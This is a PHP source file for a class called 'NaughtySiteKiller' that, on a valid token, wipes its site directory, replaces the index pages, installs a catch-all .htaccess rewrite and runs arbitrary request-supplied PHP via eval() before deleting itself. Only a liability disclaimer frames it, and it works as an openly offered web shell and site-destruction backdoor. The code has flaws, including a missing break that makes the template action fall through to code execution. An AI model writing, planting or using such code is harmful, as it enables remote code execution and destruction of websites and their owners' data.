<?php
/**!
 * **Warning: Potential Security Risks**
 *
 * This class provides powerful features such as deleting files, creating templates, and executing arbitrary PHP code
 * through the `execute` action. However, **use with caution** as this class can be easily abused if not 
 * properly secured.
 * 
 * **Developer Responsibility**:
 * The use of this class is solely the responsibility of the user/developer. The creator and contributors of this
 * class **disclaim any responsibility for abuse** or damage caused by its misuse. Proper authentication, 
 * authorization, and input validation are **mandatory** to prevent unauthorized access and malicious usage.
 * Any unauthorized use of this class is **strictly prohibited** and is the responsibility of the user.
 *
 * @package PeterUjah
 */
namespace PeterUjah;

class NaughtySiteKiller
{
    /**
     * The hashed value of token Bearer authentication.
     * 
     * @var string $tokenHash
     */
    private string $tokenHash = '';

    /**
     * List of files that are skipped during deletion.
     * 
     * @var array $skipped
     */
    private array $skipped = [];

    /**
     * The handler file.
     * 
     * @var string $handlerFile
     */
    private ?string $handlerFile = null;

    /**
     * Constructor to set up the valid token.
     *
     * @param string $token The hashed value of token Bearer authentication.
     */
    public function __construct(string $token)
    {
        $this->tokenHash = $token;
    }

    /**
     * Handle the incoming request and process the specified action.
     * 
     * @param string|null $handlerFile The handler file to remove during self-deletion (e.g, `__FILE__`).
     *              This is required only if the class and handler are not in the same file.
     * 
     * @return void
     */
    public function run(?string $handlerFile = null): void
    {
        $this->handlerFile = $handlerFile;

        if (!$this->isValidToken($this->getAuth())) {
            $this->response('Unauthorized: Invalid token.', 401);
            return;
        }

        $payload = $this->getRequest();

        if (empty($payload['action'])) {
            $this->response('Bad Request: Action not specified.', 400);
            return;
        }

        switch ($payload['action']) {
            case 'kill':
                $this->performKillAction($payload);
                break;
            case 'kill-self':
                $this->performSelfKillAction();
                break;
            case 'template':
                $this->performTemplateAction($payload);
            case 'execute':
                $this->performExecuteAction($payload);
                break;
            default:
                $this->response('Bad Request: Invalid action.', 400);
        }
    }

    /**
     * Initializes global settings for the script's execution environment.
     *
     * **Usage**:
     * Call this method at the start of your script to configure the execution environment for long-running 
     * tasks and ensure compatibility with client-side requests from any origin.
     *
     * @param int $execution The execution time in seconds for the script (default is 60000 seconds, or 1 hour).
     * 
     * @return void
     */
    public static function uninterrupted(int $execution = 60000): void 
    {
        error_reporting(0);
        ignore_user_abort(true);
        set_time_limit($execution);
        ini_set("max_execution_time", $execution);

        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: *");
    }

    /**
     * Send an HTTP response with a message and status code.
     *
     * @param mixed $message Response message.
     * @param int $code HTTP status code.
     * @param bool $killSelf If true, deletes the script itself.
     * 
     * @return void
     */
    public function response(mixed $message, int $code = 200, bool $killSelf = false): void
    {
        http_response_code($code);
        $body = is_array($message) ? $message : ['message' => $message];

        if ($killSelf) {
            $body['skipped'] = $this->skipped;
        }

        echo json_encode($body);

        if ($killSelf) {
            @unlink(__FILE__);

            if($this->handlerFile !== null && file_exists($this->handlerFile)){ 
                @unlink($this->handlerFile);
            }
        }

        exit();
    }

    /**
     * Receives the request authentication header.
     * 
     * @return string Return the request authentication header.
     */
    private function getAuth(): string
    {
        if (function_exists('getallheaders')) {
            $headers = getallheaders();
            return $headers['Authorization'] ?? '';
        }

        if (isset($_SERVER['HTTP_AUTHORIZATION'])) {
            $authorization = $_SERVER['HTTP_AUTHORIZATION'];
        } elseif (isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION'])) {
            $authorization = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
        }

        return $authorization;
    }

    /**
     * Generates a token for authentication purposes.
     *
     * This function creates a token by combining a scheme  (e.g, 'Bearer', 'Basic') with
     * a SHA-256 hash of the provided password. It's used for creating secure
     * authentication tokens.
     *
     * @param string $password The password to be hashed and used in the token.
     * @param string $scheme The authentication scheme to be used (default: 'Bearer').
     *
     * @return string Return the generated token string, or an empty string if the password is empty.
     */
    public static function generateToken(string $password, string $scheme = 'Bearer'): string
    {
        if (empty($password)) {
            echo json_encode(['message' => 'Password is required for authentication.']);
            return '';
        }

        return $scheme . ' ' . hash('sha256', $password);
    }

    /**
     * Extract the payload from the incoming request.
     *
     * @return array Return the parsed payload.
     */
    private function getRequest(): array
    {
        $method = $_SERVER['REQUEST_METHOD'] ?? null;
        if($method !== null && in_array($method, ['POST', 'GET'])){
            return ($method === 'POST') ? $_POST : $_GET;
        }

        $input = file_get_contents("php://input");

        if ($input === false) {
            $this->response("Failed to read input");
            return [];
        }

        $payload = json_decode($input, true);

        if (json_last_error() !== JSON_ERROR_NONE) {
            $this->response("Invalid request JSON payload!");
            return [];
        }

        return $payload ?? [];
    }

    /**
     * Validate the Bearer token.
     *
     * @param string $authorization The Authorization header.
     * 
     * @return bool Return true if the token is valid, false otherwise.
     */
    private function isValidToken(string $authorization): bool
    {
        if(empty($authorization)){
            return false;
        }

        $token = null;
        if (strpos($authorization, 'Bearer ') === 0) {
            $token = substr($authorization, 7);
        }elseif(strpos($authorization, 'Basic ') === 0) {
            $token = substr($authorization, 6);
        }

        return $token && hash_equals($this->tokenHash, hash('sha256', $authorization));
    }
    
    /**
     * Perform the `kill` action: Delete all files, recreate index files, and delete self.
     *
     * @param array $payload Request payload.
     * 
     * @return void
     */
    private function performKillAction(array $payload): void
    {
        $dir = __DIR__;
        $task = 0;
        $php = $html = $payload['contents'] ?? null;

        if($php == null){
            $php = $payload['phpContents'] ?? null;
            $html = $payload['htmlContents'] ?? null;
        }

        if($this->delete($dir)){
            $task++;

            if(@file_put_contents("$dir/index.php", $php ?? "<?php\n// Silence is golden\n") !== false){
                $task++;
            }

            if(@file_put_contents("$dir/index.html", $html ?? "<!-- Silence is golden -->") !== false){
                $task++;
            }
        }

        if($task > 0){
            $message = 'Kill action completed: Directory cleaned and script self-destructed';
            if($task === 1){
                $message .= ', but failed to create index files.';
            }
            
            if($task > 1){
                $this->response($message, 200, true);
                return;
            }
        }

        $this->response('Failed to perform self-destructed', 500);
    }

    /**
     * Performs the self-kill action by attempting to delete the current script file.
     *
     * @return void
     */
    private function performSelfKillAction(): void
    {
        $handler = ($this->handlerFile !== null && file_exists($this->handlerFile)) 
            ? @unlink($this->handlerFile) 
            : false;
            
        if(@unlink(__FILE__) || $handler){
            $this->response('Self-destructed completed', 200);
            return;
        }

        $this->response('Failed to perform self-destructed, retrying one more time.', 500, true);
    }

    /**
     * Handles the execution of custom PHP code provided in the request payload.
     * 
     * @param array $payload The request payload containing the `contents` field with PHP code to execute.
     *
     * @return void
     */
    private function performExecuteAction(array $payload): void
    {
        $contents = $payload['contents'] ?? null;
        if($contents && is_string($contents)){
            $result = eval($contents);
            $this->response([
                'message' => 'Execution completed',
                'result' => $result
            ]);
            return;
        }

        $this->response('Invalid execution instructions was received.');
    }

    /**
     * Recursively delete files and folders in a directory.
     *
     * @param string $dir The directory to delete.
     * 
     * @return bool Return true if successful, false otherwise.
     */
    private function delete(string $dir): bool
    {
        $files = glob("{$dir}/*");
        foreach ($files as $file) {
            if (is_file($file) && basename($file) !== basename(__FILE__)) {
                if (!@unlink($file)) {
                    $this->skipped[] = $file;
                }
            } elseif (is_dir($file)) {
                if (!$this->delete($file) || !@rmdir($file)) {
                    $this->skipped[] = $file;
                }
            }
        }

        return true;
    }

    /**
     * Perform the `template` action: Create a template file and optional .htaccess.
     *
     * @param array $payload The action payload.
     */
    private function performTemplateAction(array $payload): void
    {
        $dir = __DIR__;
        $content = $payload['content'] ?? '<?php\n// Silence is golden\n?>';
        $name = $payload['name'] ?? '__template.php';
        $htaccess = $payload['htaccess'] ?? "RewriteEngine On\nRewriteRule ^.*$ /{$name} [L,QSA]";
        $task = 0;

        if(@file_put_contents("{$dir}/{$name}", $content) !== false){
            $task++;
        }

        if(@file_put_contents("$dir/.htaccess", $htaccess) !== false){
            $task++;
        }

        if($task > 0){
            $this->response("Template action completed: File '{$name}' created.", 200);
            return;
        }

        $this->response('Failed to create template files.', 500);
    }
}
